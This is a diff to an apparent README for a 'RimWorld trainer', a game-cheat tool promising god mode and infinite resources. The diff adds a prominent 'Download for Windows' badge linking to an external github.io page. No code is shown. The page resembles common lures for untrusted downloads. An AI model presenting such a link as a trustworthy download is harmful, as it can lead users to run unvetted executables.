@@ -4,6 +4,9 @@
 
 **RimWorld** is a tough survival sim full of random disasters, brutal raids, and resource shortages. But with a **RimWorld trainer**, you can bend the rules and take total control. Trainers unlock features like god mode, infinite resources, instant build, and fast-forward hacks – perfect for stress-free colonies or creative experiments.
 
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-purple?logo=windows\&style=for-the-badge)](https://rimworld-trainer.github.io/.github/)
+
+
 ---
 
 ## Product Description
